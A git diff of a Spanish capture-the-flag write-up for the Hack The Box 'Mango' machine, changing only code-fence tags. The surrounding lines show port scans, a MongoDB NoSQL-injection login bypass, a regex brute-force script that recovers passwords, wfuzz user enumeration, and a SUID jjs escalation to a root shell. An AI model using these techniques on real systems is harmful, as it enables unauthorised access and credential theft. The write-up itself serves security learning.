@@ -33,7 +33,7 @@ Iniciamos por ejecutar un `masscan` para descubrir puertos udp y tcp abiertos, y
 
 ## masscan
 
-```
+``` text
 root@laptop:~# masscan -e tun0 -p0-65535,U:0-65535 --rate 500 10.10.10.162 | tee /home/tony/htb/mango/masscan.log
 Discovered open port 22/tcp on 10.10.10.162                                    
 Discovered open port 80/tcp on 10.10.10.162                                    
@@ -48,7 +48,7 @@ Descubrimos 3 puertos abiertos; 22, 80 y 443. Ahora con `nmap`, identifiquemos l
 
 ## nmap services
 
-```
+``` text
 root@laptop:~# nmap -sS -sV -sC -p $(cat /home/tony/htb/mango/masscan.log | cut -d' ' -f4 | sed 's/\/tcp.*//' | tr '\n' ',') -n --open -v 10.10.10.162 -oN /home/tony/htb/mango/service.nmap
 # Nmap 7.80 scan initiated Thu Mar 26 15:24:16 2020 as: nmap -sS -sV -sC -p 22,80,443, -n --open -v -oN /home/tony/htb/mango/service.nmap 10.10.10.162
 Nmap scan report for 10.10.10.162
@@ -105,7 +105,7 @@ Encontramos los servicios de SSH, HTTP, HTTPS en sus puertos por defecto. Por lo
 
 Inicio la exploración de la aplicación usando httpie y firefox+burpsuite. En algunas partes estaré utilizando httpie+burpsuite por la flexibilidad de poder usar bash.
 
-```
+``` text
 tony@laptop:~/htb/mango$ http 10.10.10.162
 <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
 <html><head>
@@ -122,7 +122,7 @@ En el root del servidor tenemos un *403*, así que continuemos con la búsqueda 
 
 ## dirsearch
 
-```
+``` text
 tony@laptop:~/htb/mango$ dirsearch http://10.10.10.162
  _|. _ _  _  _  _ _|_    v0.3.9
 (_||| _) (/_(_|| (_| )
@@ -144,7 +144,7 @@ El resultado que `dirsearch` nos devuelve sobre el puerto HTTP es poco significa
 
 ## testssl
 
-```
+``` text
 tony@laptop:~/htb/mango$ testssl 10.10.10.162
  Testing server defaults (Server Hello)
 
@@ -182,7 +182,7 @@ La salida de testssl es bastante extensa, así que omití información y deje ú
 
 Realizando un request con httpie y usando el header de Host, obtenemos la siguiente salida:
 
-```
+``` text
 tony@laptop:~/htb/mango$ http http://10.10.10.162 "Host:staging-order.mango.htb"
 <!DOCTYPE html>
 <html lang="en">
@@ -405,7 +405,7 @@ Después de descubrir la aplicación, intente ingresar con credenciales por defe
 
 ## dirsearch on staging-order
 
-```
+``` text
 tony@laptop:~/htb/mango$ dirsearch http://staging-order.mango.htb
 
  _|. _ _  _  _  _ _|_    v0.3.9
@@ -437,7 +437,7 @@ Target: http://staging-order.mango.htb
 
 Descubrimos que la aplicación utiliza Composer (PHP) y que podemos leer más de un archivo del proyecto. Veamos que instaló composer vía **installed.json**:
 
-```
+``` text
 tony@laptop:~/htb/mango$ http http://staging-order.mango.htb/vendor/composer/installed.json
 HTTP/1.1 200 OK
 Accept-Ranges: bytes
@@ -591,7 +591,7 @@ Aquí es cuando hice click. Mango-Mongo. La aplicación usa mongodb para la aute
 
 Entre las notas, hay una manera interesante de evaluar si la aplicación es susceptible a una inyección NOSQLi tipo blind; podemos efectuar una condición true al enviarle un "not equal" con un valor "no valido". Lo que buscamos con esta prueba, es un tipo de respuesta que indique un cambio en el code del response o en la cantidad de caracteres del reponse, así que tratemos de autenticarnos con el usuario y contraseña "miau":
 
-```
+``` text
 tony@laptop:~/htb/mango$ http -f --proxy http:http://127.0.0.1:8080  POST http://staging-order.mango.htb/index.php 'username[$ne]=miau' 'password[$ne]=miau' login=login
 HTTP/1.1 302 Found
 Cache-Control: no-store, no-cache, must-revalidate
@@ -617,7 +617,7 @@ Al entrar a la aplicación vemos que dentro del body de `home.php`, hay un corre
 
 Dentro de las notas de payloadAllTheThings, hay un script de como realizar un brute force en peticiones POST, que convenientemente modificamos para esta máquina.
 
-```python
+``` python
 import requests
 import urllib3
 import string
@@ -646,7 +646,7 @@ Este brute forcer funciona gracias a las expresiones regulares, por que lo que r
 
 Al ejecutar el script tenemos lo siguiente:
 
-```
+``` text
 tony@laptop:~/htb/mango$ python discover_admin.py
 Found one more char : t
 Found one more char : t9
@@ -674,7 +674,7 @@ Continua *true* porque el inicio siempre es valido y porque no sabemos la longit
 
 Probamos las credenciales descubiertas para admin:
 
-```
+``` text
 tony@laptop:~/htb/mango$ http --header -f --proxy http:http://127.0.0.1:8080  POST http://staging-order.mango.htb/index.php 'username=admin' 'password=t9KcS3>!0B#2' login=login
 HTTP/1.1 302 Found
 Cache-Control: no-store, no-cache, must-revalidate
@@ -698,7 +698,7 @@ Unos minutos después, me dí cuenta de que no había nada relevante en esta par
 
 Usamos cewl para tomar cualquier valor que nos pueda servir dentro de la aplicación, y con esto, creamos un diccionario con mayúsculas y minúsculas:
 
-```
+``` text
 tony@laptop:~/htb/mango$ (cewl http://staging-order.mango.htb; cewl http://staging-order.mango.htb | tr '[:upper:]' '[:lower:]' ; cewl http://staging-order.mango.htb | tr '[:lower:]' '[:upper:]')  | grep -vi ninja | tee dict1.txt
 Mango
 Sweet
@@ -737,7 +737,7 @@ LOGIN
 
 Ahora usando `wfuzz` hacemos bruteforce de todos los posibles usuarios dentro del diccionario. Para la contraseña usamos una condición mayor a 1, aunque también hubiera funcionado con un "not equal":
 
-```
+``` text
 tony@laptop:~/htb/mango$ wfuzz -w dict1.txt --sc 302 -d 'username%5B%24eq%5D=FUZZ&password%5B%24gt%5D=1&login=login' http://staging-order.mango.htb/index.php
 
 Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
@@ -763,7 +763,7 @@ Requests/sec.: 63.44717
 
 Descubrimos al usuario mango, porque ya saben, "creatividad". Extendí el ataque con otro diccionario y busque más usuarios:
 
-```
+``` text
 tony@laptop:~/htb/mango$ wfuzz -w ~/git/SecLists/Usernames/xato-net-10-million-usernames.txt --sc 302 -d 'username%5B%24eq%5D=FUZZ&password%5B%24gt%5D=1&login=login' http://staging-order.mango.htb/index.php
 
 Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
@@ -791,7 +791,7 @@ Después de un muchas búsquedas, cancele el bruteforce y continué con lo sigui
 
 Copie el archivo de `discover_admin.py`, modifique el usuario y lance el nuevo script `discover_mango.py`:
 
-```
+``` text
 tony@laptop:~/htb/mango$ python discover_mango.py
 Found one more char : h
 Found one more char : h3
@@ -824,7 +824,7 @@ Ahora tenemos otras credenciales mas.
 
 Ahora con estas nuevas credenciales, probé nuevamente el servicio SSH, esta vez, teniendo éxito:
 
-```
+``` text
 tony@laptop:~$ ssh mango@10.10.10.162
 mango@10.10.10.162's password:
 Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 4.15.0-64-generic x86_64)
@@ -858,7 +858,7 @@ uid=1000(mango) gid=1000(mango) groups=1000(mango)
 
 Al fin, después de muchas vueltas y ciclos de CPU perdidos para siempre, ingresamos al servidor como _mango_. Leemos el archivo `/etc/passwd` y vemos a un viejo conocido, __admin__.
 
-```
+``` text
 mango@mango:~$ tail /etc/passwd
 _apt:x:104:65534::/nonexistent:/usr/sbin/nologin
 lxd:x:105:65534::/var/lib/lxd/:/bin/false
@@ -876,7 +876,7 @@ Luego dije, ¿porque no pude acceder como admin, sera que son otras credenciales
 
 Así que revise el archivo del servicio SSH:
 
-```
+``` text
 mango@mango:~$ cat /etc/ssh/sshd_config  | grep -vE '^#|^$'
 PermitRootLogin yes
 ChallengeResponseAuthentication no
@@ -891,7 +891,7 @@ AllowUsers mango root
 
 Pues con esto me quedo claro que solo mango o root podían acceder. Así que hice un switch con `su - admin`:
 
-```
+``` text
 mango@mango:~$ su - admin
 Password:
 $
@@ -908,7 +908,7 @@ Perfecto, ahora que somos admin, podemos tomar la bandera de user.
 
 # user.txt
 
-```
+``` text
 admin@mango:/home/admin$ cat user.txt
 <omitido>
 ```
@@ -919,7 +919,7 @@ admin@mango:/home/admin$ cat user.txt
 
 Ahora como admin y antes de lanzar un linenum, busque archivos donde admin fuera propietario o perteneciera al grupo:
 
-```
+``` text
 admin@mango:/home/admin$ find /usr -user admin -type f 2>/dev/null
 admin@mango:/home/admin$ find /usr -group admin -type f 2>/dev/null
 /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs
@@ -933,13 +933,13 @@ El resultado es claro, tenemos SUID en este archivo, el cual root es owner y nos
 
 No tomo ni 2 minutos y gtfobins ya tenia una nota asociada.
 
-```
+``` text
 https://gtfobins.github.io/gtfobins/jjs/#suid
 ```
 
 Siguiendo la nota de gtfobins, y haciendo un par de cambios, preparamos el siguiente script para `jjs`
 
-```java
+``` java
 Java.type('java.lang.Runtime')
   .getRuntime()
     .exec('/bin/bash -pc $@|bash${IFS}-p _ echo bash -p <$(tty) >$(tty) 2>$(tty)')
@@ -955,7 +955,7 @@ Este exec es un tanto rebuscado e interesante, asi que por partes:
 
 Este pequeño script de bash funciona como un pipe que recibe instrucciones vía argumentos, es por eso que cuando lo ejecutamos la primera vez, parece un tanto atorado porque no vemos el salto de linea entre instrucción e instrucción.
 
-```
+``` text
 admin@mango:/home/admin$ echo "Java.type('java.lang.Runtime').getRuntime().exec('/bin/bash -pc \$@|bash\${IFS}-p _ echo bash -p <$(tty) >$(tty) 2>$(tty)').waitFor()" | /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs
 Warning: The jjs tool is planned to be removed from a future JDK release
 jjs> Java.type('java.lang.Runtime').getRuntime().exec('/bin/bash -pc $@|bash${IFS}-p _ echo bash -p </dev/pts/0 >/dev/pts/0 2>/dev/pts/0').waitFor()
@@ -965,7 +965,7 @@ bash-4.4# bash-4.4# bash-4.4# reset
 
 Para reparar esto, actualizamos las variables ejecutando un `reset` sobre bash que nos ayude a tener una mejor interacción con esta terminal:
 
-```
+``` text
 Interrupt set to control-C (^C).
 bash-4.4# ls
 user.txt
@@ -975,7 +975,7 @@ uid=4000000000(admin) gid=1001(admin) euid=0(root) groups=1001(admin)
 
 # root.txt
 
-```
+``` text
 bash-4.4# cat /root/root.txt
 <omitido>
 ```
